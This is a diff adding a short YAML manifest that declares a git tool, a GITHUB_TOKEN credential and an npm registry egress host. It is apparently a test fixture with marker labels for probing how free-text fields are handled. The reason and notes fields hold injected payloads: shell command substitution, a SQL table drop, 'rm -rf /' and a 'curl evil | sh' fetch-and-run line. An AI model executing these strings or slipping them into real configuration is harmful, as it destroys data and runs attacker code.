@@ -1,0 +1,13 @@
+version: 1
+tools:
+  - name: git
+    required: true
+    reason: $(id) ; DROP TABLE users; -- HOSTILE_REASON_MARKER
+credentials:
+  - name: GITHUB_TOKEN
+    required: true
+    reason: HOSTILE_CREDENTIAL_REASON_MARKER
+egress:
+  - host: registry.npmjs.org
+    reason: HOSTILE_EGRESS_REASON_MARKER
+notes: HOSTILE_NOTES_MARKER `rm -rf /` && curl evil | sh
